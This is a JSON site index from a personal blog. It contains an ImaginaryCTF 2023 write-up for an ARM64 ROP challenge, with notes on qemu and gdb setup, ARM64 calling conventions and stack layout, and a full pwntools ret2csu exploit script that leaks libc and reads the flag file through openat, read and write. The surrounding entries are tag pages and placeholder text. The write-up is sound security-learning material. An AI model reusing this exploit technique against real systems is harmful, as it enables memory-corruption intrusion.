[{"content":"","date":"25 July 2023","permalink":"/tags/arm64/","section":"Tags","summary":"","title":"ARM64"},{"content":"","date":"25 July 2023","permalink":"/categories/","section":"Categories","summary":"","title":"Categories"},{"content":"","date":"25 July 2023","permalink":"/","section":"d0UBleW's Blog","summary":"","title":"d0UBleW's Blog"},{"content":" Work in progress. Note # Not sure why the exploit does not work in non-debug mode locally, but works for local debug-mode and remote non-debug aarch64 (ARM64) # Tools # References: https://docs.pwntools.com/en/stable/qemu.html\ngcc toolchain (with gdb): https://github.com/xpack-dev-tools/aarch64-none-elf-gcc-xpack/ qemu: sudo apt-get install qemu-user-static libs: sudo apt-get install libc6-arm64-cross installs to /usr/aarch64-linux-gnu/ Running the binary\n# non-debug mode qemu-aarch64-static ./binary # debug mode (gdbserver) on port 1234 qemu-aarch64-static -g 1234 ./binary Attach debugger with GEF\ngefâž¤ gef-remote --qemu-user localhost 1234 Assembly # References: http://blog.perfect.blue/ROPing-on-Aarch64\nRegisters # x0 to x7 are used to pass arguments x29 is equivalent to rbp in x86 x30 stores return address Function Prologue # Pre-indexed performs the offset operation then the assembly instruction:\nAdd N to sp (sp = sp + N) Stores old frame pointer, x29, to [sp] and return address, x30, to [sp + 8] stp x29, x30, [sp, #N]! ; pre-indexed [base, #offset]! mov x29, sp Function Epilogue # Post-indexed performs the assembly instruction then the offset operation\nLoad [sp] to x29 and [sp + 8] to x30 Add N to sp (sp = sp + N) ldp x29, x30, [sp], #N ; post-indexed [base], #offset Stack Layout # +--------------------------+ ^ Lower memory address | callee\u0026#39;s saved x29 | | +--------------------------+ | | callee\u0026#39;s saved x30 | | +--------------------------+ | Stack growth direction | callee\u0026#39;s local variables | +--------------------------+ | caller\u0026#39;s saved x29 | +--------------------------+ | caller\u0026#39;s saved x30 | +--------------------------+ | caller\u0026#39;s local variables | +--------------------------+ Higher memory address Unlike in x86 where saved rbp and rip are below the local variables which allow us to overwrite the saved rip and immediately return to our desired address, in ARM64 we overwrite the callers\u0026rsquo;s return address instead due to the stack layout which means that we would first return normally to the caller and only then return to our desired address\nSolution # #!/usr/bin/env python3 # type: ignore # flake8: noqa from pwn import * ld = ELF(\u0026#34;./ld-linux-aarch64.so.1\u0026#34;) libc = ELF(\u0026#34;./libc.so.6\u0026#34;) elf = context.binary = ELF(\u0026#34;./vuln\u0026#34;) def start(argv=[], *a, **kw): global flag_path host = args.HOST or \u0026#39;generic-rop-challenge.chal.imaginaryctf.org\u0026#39; port = int(args.PORT or 42042) if args.REMOTE: flag_path = b\u0026#34;/home/user/flag.txt\\x00\u0026#34; return remote(host, port) if args.GDB: flag_path = b\u0026#34;/run/shm/flag.txt\\x00\u0026#34; return process([qemu, \u0026#34;-g\u0026#34;, str(debug_port), elf.path]) else: flag_path = b\u0026#34;/run/shm/flag.txt\\x00\u0026#34; return process([qemu, elf.path] + argv, env=env, *a, **kw) env = {} qemu = \u0026#34;/usr/bin/qemu-aarch64-static\u0026#34; debug_port = 1234 flag_path = b\u0026#34;\u0026#34; io = start() pad = 80 - 0x10 main_x29 = b\u0026#34;BBBBBBBB\u0026#34; bss = elf.bss(0x200) csu_1 = 0x400948 csu_2 = 0x400928 def ret2csu(w0, x1, x2, func_ptr, next_gadget): payload = b\u0026#34;A\u0026#34; * pad + main_x29 + p64(csu_1) payload += flat(bss, p64(csu_2)) payload += flat(0, 1) # x19, x20 payload += flat(func_ptr, w0) # x21, x22 payload += flat(x1, x2) # x23, x24 payload += flat(bss, next_gadget) return payload # Leak LIBC payload = ret2csu(elf.got[\u0026#34;puts\u0026#34;], 0, 0, elf.got[\u0026#34;puts\u0026#34;], elf.symbols[\u0026#34;main\u0026#34;]) io.sendlineafter(b\u0026#34;below\\n\u0026#34;, payload) leak_puts = u64(io.recvline(keepends=False).ljust(8, b\u0026#34;\\x00\u0026#34;)) if not args.REMOTE: leak_puts |= 0x4000000000 log.info(f\u0026#34;{leak_puts=:#x}\u0026#34;) libc.address = leak_puts - libc.symbols[\u0026#34;puts\u0026#34;] log.info(f\u0026#34;{libc.address=:#x}\u0026#34;) # gets(bss) // stdin: /home/user/flag.txt pause() log.info(f\u0026#34;setup flag path string @ bss + 0x500\u0026#34;) log.info(f\u0026#34;{flag_path=}\u0026#34;) flag_path_addr = elf.bss(0x500) payload = ret2csu(flag_path_addr, 0, 0, elf.got[\u0026#34;gets\u0026#34;], elf.symbols[\u0026#34;main\u0026#34;]) io.sendlineafter(b\u0026#34;below\\n\u0026#34;, payload) io.sendline(flag_path) # absolute path to ignore `dirfd` for `openat` # gets(bss) // stdin: libc.symbols[\u0026#34;openat\u0026#34;] openat_fptr = elf.bss(0x600) log.info(f\u0026#34;setup openat function pointer @ bss + 0x600\u0026#34;) payload = ret2csu(openat_fptr, 0, 0, elf.got[\u0026#34;gets\u0026#34;], elf.symbols[\u0026#34;main\u0026#34;]) io.sendlineafter(b\u0026#34;below\\n\u0026#34;, payload) io.sendline(p64(libc.symbols[\u0026#34;openat\u0026#34;])) # fini_ptr = 0x400e20 # openat(0, flag_path_addr, 0) log.info(f\u0026#34;openat(0, flag_path_addr, 0)\u0026#34;) payload = ret2csu(0, flag_path_addr, 0, openat_fptr, elf.symbols[\u0026#34;main\u0026#34;]) io.sendlineafter(b\u0026#34;below\\n\u0026#34;, payload) # gets(bss) // stdin: libc.symbols[\u0026#34;read\u0026#34;] read_fptr = elf.bss(0x600) log.info(f\u0026#34;setup read function pointer @ bss + 0x600\u0026#34;) payload = ret2csu(read_fptr, 0, 0, elf.got[\u0026#34;gets\u0026#34;], elf.symbols[\u0026#34;main\u0026#34;]) io.sendlineafter(b\u0026#34;below\\n\u0026#34;, payload) io.sendline(p64(libc.symbols[\u0026#34;read\u0026#34;])) # read(5, flag_addr, 0x100) flag_addr = elf.bss(0x700) log.info(f\u0026#34;read(5, flag_addr, 0x100)\u0026#34;) # trial-and-error to find the proper fd payload = ret2csu(5, flag_addr, 0x100, read_fptr, elf.symbols[\u0026#34;main\u0026#34;]) io.sendlineafter(b\u0026#34;below\\n\u0026#34;, payload) # gets(bss) // stdin: libc.symbols[\u0026#34;write\u0026#34;] write_fptr = elf.bss(0x600) log.info(f\u0026#34;setup write function pointer @ bss + 0x600\u0026#34;) payload = ret2csu(write_fptr, 0, 0, elf.got[\u0026#34;gets\u0026#34;], elf.symbols[\u0026#34;main\u0026#34;]) io.sendlineafter(b\u0026#34;below\\n\u0026#34;, payload) io.sendline(p64(libc.symbols[\u0026#34;write\u0026#34;])) # write(1, flag_addr, 0x100) payload = ret2csu(1, flag_addr, 0x100, write_fptr, elf.symbols[\u0026#34;main\u0026#34;]) io.sendlineafter(b\u0026#34;below\\n\u0026#34;, payload) io.interactive() ","date":"25 July 2023","permalink":"/posts/imaginaryctf-2023/pwn/generic-rop-challenge/","section":"My Average Blog","summary":"ARM64 ROP with \u003ccode\u003eret2csu\u003c/code\u003e","title":"generic-rop-challenge"},{"content":"","date":"25 July 2023","permalink":"/categories/imaginaryctf-2023/","section":"Categories","summary":"","title":"ImaginaryCTF 2023"},{"content":"Lorem ipsum dolor sit amet, qui minim labore adipisicing minim sint cillum sint consectetur cupidatat.\n","date":"25 July 2023","permalink":"/posts/","section":"My Average Blog","summary":"Lorem ipsum dolor sit amet, qui minim labore adipisicing minim sint cillum sint consectetur cupidatat.","title":"My Average Blog"},{"content":"","date":"25 July 2023","permalink":"/categories/pwn/","section":"Categories","summary":"","title":"pwn"},{"content":"","date":"25 July 2023","permalink":"/tags/rop/","section":"Tags","summary":"","title":"ROP"},{"content":"","date":"25 July 2023","permalink":"/tags/","section":"Tags","summary":"","title":"Tags"},{"content":"Trying to learn pwn and reversing.\n","date":"1 January 0001","permalink":"/about/","section":"d0UBleW's Blog","summary":"Trying to learn pwn and reversing.","title":"About"},{"content":"","date":"1 January 0001","permalink":"/authors/","section":"Authors","summary":"","title":"Authors"},{"content":"","date":"1 January 0001","permalink":"/series/","section":"Series","summary":"","title":"Series"}]